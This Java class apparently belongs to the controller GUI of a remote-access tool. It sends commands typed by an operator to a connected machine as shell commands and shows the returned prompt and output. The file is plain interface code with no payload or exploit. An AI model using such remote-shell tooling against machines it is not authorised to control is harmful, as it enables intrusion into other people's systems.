package GUI.TableUtils.ReverseShell;

import Information.Action;

import javax.swing.*;
import javax.swing.text.DefaultCaret;
import java.io.IOException;
import java.util.Arrays;

public class CommandSender extends SwingWorker<Void, Void> {
    private final ReverseShellGUI reverseShellGUI;
    String command;

    public CommandSender(ReverseShellGUI reverseShellGUI) {
        this.reverseShellGUI = reverseShellGUI;
        command = reverseShellGUI.getFieldOfCommands().getText();

    }

    String userConsolePosition = "";
    String resultOfCommand = "";

    @Override
    protected Void doInBackground() throws IOException {
        String response = reverseShellGUI.getStream().sendAndReadJSONX(Action.SHELL_COMMAND, command);
        System.out.println(response);
        String[] arrayOfInformation = response.split("\\|");
        userConsolePosition = arrayOfInformation[0];
        if (arrayOfInformation.length > 1) resultOfCommand = arrayOfInformation[1];
        return null;
    }

    @Override
    protected void done() {
        String totalResult = userConsolePosition + ">" + command + "\n"+resultOfCommand + "\n"+userConsolePosition+">";
        reverseShellGUI.getTextAreaOfResult().append(totalResult);
    }
}
